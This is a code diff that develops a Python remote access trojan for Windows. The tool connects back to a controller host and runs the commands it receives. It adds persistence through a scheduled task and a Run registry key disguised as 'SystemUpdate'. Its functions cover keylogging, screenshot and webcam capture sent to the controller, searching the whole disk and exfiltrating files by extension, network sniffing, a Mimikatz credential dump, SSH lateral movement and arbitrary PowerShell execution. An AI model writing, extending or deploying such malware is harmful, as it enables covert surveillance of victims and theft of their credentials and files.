@@ -5,38 +5,44 @@ import time
 import pyautogui
 import cv2
 from pynput.keyboard import Listener
-from scapy.all import *
+from scapy.all import sniff, Raw
 import paramiko
 
-# Define your listener IP and port
-# IP = "192.168.0.106"
-IP = "10.0.2.18"
-PORT = 52568
+# Server connection settings
+IP = "192.168.100.6"
+PORT = 5050
 
-# Establish a socket connection
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((IP, PORT))
-
-# Functions for additional capabilities
-# -------------------------------------
-
-# Privilege Escalation and Persistence
 def escalate_privileges():
-    # Attempt to re-run shell as admin
-    subprocess.run(["powershell", "-Command", "Start-Process powershell -Verb runAs"], capture_output=True)
+    script_path = os.path.abspath(__file__)  
+    script_path_escaped = script_path.replace('\\', '\\\\')  
+    task_name = "ElevatedPythonTask"
+    
+    command_create = f'SCHTASKS /CREATE /TN "{task_name}" /TR "python \\"{script_path_escaped}\\"" /SC ONLOGON /RL HIGHEST /F'
+    
+    result_create = subprocess.run(["powershell", "-Command", command_create], capture_output=True, text=True)
+    if result_create.returncode != 0:
+        print(f"[ERROR] Failed to create task: {result_create.stderr.strip()}")
+        return  
+    
+    result_run = subprocess.run(["powershell", "-Command", f"SCHTASKS /RUN /TN \"{task_name}\""], capture_output=True, text=True)
+    if result_run.returncode != 0:
+        print(f"[ERROR] Failed to run task: {result_run.stderr.strip()}")
 
 def setup_persistence():
-    # Get the absolute path of the current script
     script_path = os.path.abspath(__file__)
-    
-    # Registry persistence to run script on startup
-    subprocess.run([
-        "powershell", "-Command",
-        f"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemUpdate' "
-        f"-Value 'python {script_path}' -PropertyType String"
-    ])
+    registry_path = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+    property_name = 'SystemUpdate'
 
-# Keylogger
+    check_command = f"Get-ItemProperty -Path '{registry_path}' -Name '{property_name}' -ErrorAction SilentlyContinue"
+    result = subprocess.run(["powershell", "-Command", check_command], capture_output=True, text=True)
+
+    if result.returncode != 0:
+        create_command = f"New-ItemProperty -Path '{registry_path}' -Name '{property_name}' -Value 'python \"{script_path}\"' -PropertyType String"
+        subprocess.run(["powershell", "-Command", create_command])
+        print("[INFO] Persistence set up successfully.")
+    else:
+        print("[INFO] Persistence already exists; skipping creation.")
+
 def start_keylogger():
     def on_press(key):
         with open("C:\\Users\\Public\\keylogs.txt", "a") as log:
@@ -44,13 +50,30 @@ def start_keylogger():
     listener = Listener(on_press=on_press)
     listener.start()
 
-# Screenshot Capture
 def capture_screenshot():
     screenshot = pyautogui.screenshot()
-    screenshot.save("C:\\Users\\Public\\screenshot.png")
-    # Optionally add file transfer code to send to server
+    screenshot_path = "C:\\Users\\Public\\screenshot.png"
+    screenshot.save(screenshot_path)
+    print("[INFO] Screenshot captured.")
+    # return screenshot_path
 
-# File Exfiltration
+def capture_webcam():
+    cam = cv2.VideoCapture(0)
+    if not cam.isOpened():
+        print("[ERROR] Unable to access the webcam.")
+        return None
+
+    ret, frame = cam.read()
+    webcam_path = "C:\\Users\\Public\\webcam.jpg"
+    if ret:
+        cv2.imwrite(webcam_path, frame)
+        print("[INFO] Webcam image captured.")
+        return webcam_path
+    else:
+        print("[ERROR] Failed to capture webcam image.")
+    cam.release()
+    return None
+
 def find_and_exfiltrate_files(extension):
     for root, dirs, files in os.walk("C:\\"):
         for file in files:
@@ -58,17 +81,8 @@ def find_and_exfiltrate_files(extension):
                 file_path = os.path.join(root, file)
                 with open(file_path, "rb") as f:
                     data = f.read()
-                    s.send(data)  # Example of sending file content
+                    client_socket.send(data)
 
-# Webcam Access
-def capture_webcam():
-    cam = cv2.VideoCapture(0)
-    ret, frame = cam.read()
-    if ret:
-        cv2.imwrite("C:\\Users\\Public\\webcam.jpg", frame)
-    cam.release()
-
-# Network Sniffing
 def sniff_network():
     def packet_callback(packet):
         if packet.haslayer(Raw):
@@ -76,49 +90,110 @@ def sniff_network():
                 log.write(str(packet[Raw].load) + "\n")
     sniff(prn=packet_callback, store=0)
 
-# Credential Dumping
 def dump_credentials():
-    subprocess.run(["powershell", "-Command", "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"], capture_output=True)
+    result = subprocess.run(["powershell", "-Command", "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"], capture_output=True)
+    if result.returncode == 0:
+        print("[INFO] Credentials dumped.")
+    else:
+        print("[ERROR] Failed to dump credentials.")
 
-# Lateral Movement
 def lateral_movement(target_ip, username, password):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    ssh.connect(target_ip, username=username, password=password)
-    # Deploy your reverse shell or commands here
+    try:
+        ssh.connect(target_ip, username=username, password=password)
+        print("[INFO] Lateral movement complete.")
+    except Exception as e:
+        print(f"[ERROR] Lateral movement failed: {str(e)}")
 
-# Initialize privilege escalation, persistence, and keylogger at startup
+
+
+
+
+def list_drives():
+    drives = []
+    for drive in range(65, 91):  # ASCII 'A' to 'Z'
+        drive_letter = f"{chr(drive)}:"
+        if os.path.exists(drive_letter):
+            drives.append(drive_letter)
+    return drives
+
+def list_directory(path):
+    try:
+        return os.listdir(path)
+    except Exception as e:
+        return str(e)
+
+def change_directory(path):
+    try:
+        os.chdir(path)
+        return f"[INFO] Changed directory to: {os.getcwd()}"
+    except FileNotFoundError:
+        return f"[ERROR] Directory not found: {path}"
+
+def execute_powershell_command(command):
+    result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
+    return result.stdout + result.stderr
+
+
+
+
+
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client_socket.connect((IP, PORT))
+
 escalate_privileges()
 setup_persistence()
 start_keylogger()
 
-# Main reverse shell loop
-while True:
-    # Receive command from the listener
-    command = s.recv(1024).decode("utf-8")
+try:
+    while True:
+        command = client_socket.recv(1024).decode("utf-8").strip('"')
 
-    if command.lower() == "exit":
-        break
-    elif command.lower() == "screenshot":
-        capture_screenshot()
-    elif command.lower() == "webcam":
-        capture_webcam()
-    elif command.lower().startswith("exfiltrate"):
-        # Expecting format "exfiltrate .ext"
-        _, extension = command.split()
-        find_and_exfiltrate_files(extension)
-    elif command.lower() == "sniff":
-        sniff_network()
-    elif command.lower() == "dumpcreds":
-        dump_credentials()
-    elif command.lower().startswith("move"):
-        # Expecting format "move target_ip username password"
-        _, target_ip, username, password = command.split()
-        lateral_movement(target_ip, username, password)
-    else:
-        # Execute other PowerShell commands as before
-        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
-        s.send(result.stdout.encode("utf-8") + result.stderr.encode("utf-8"))
+        if command.lower() == "exit":
+            break
+        elif command.lower() == "listdrives":
+            drives = list_drives()
+            client_socket.send(", ".join(drives).encode("utf-8"))
+        elif command.lower().startswith("cd "):
+            path = command[3:].strip()
+            response = change_directory(path)
+            client_socket.send(response.encode("utf-8"))
+        elif command.lower() == "dir":
+            current_dir = os.getcwd()
+            directory_contents = list_directory(current_dir)
+            client_socket.send("\n".join(directory_contents).encode("utf-8"))
+        elif command.lower() == "screenshot":
+            screenshot_path = capture_screenshot()
+            if screenshot_path:
+                with open(screenshot_path, "rb") as f:
+                    client_socket.sendall(f.read())
+        elif command.lower() == "webcam":
+            webcam_path = capture_webcam()
+            if webcam_path:
+                with open(webcam_path, "rb") as f:
+                    client_socket.sendall(f.read())
 
-# Close the connection
-s.close()
+
+        elif command.lower().startswith("exfiltrate"):
+            _, extension = command.split()
+            find_and_exfiltrate_files(extension)
+            client_socket.send(b"[INFO] File exfiltration complete.")
+
+
+            
+        elif command.lower() == "sniff":
+            sniff_network()
+            client_socket.send(b"[INFO] Network sniffing started.")
+        elif command.lower() == "dumpcreds":
+            dump_credentials()
+            client_socket.send(b"[INFO] Credentials dumped.")
+        else:
+            response = execute_powershell_command(command)
+            client_socket.send(response.encode("utf-8"))
+
+except Exception as e:
+    client_socket.send(f"[ERROR] {str(e)}".encode("utf-8"))
+
+finally:
+    client_socket.close()
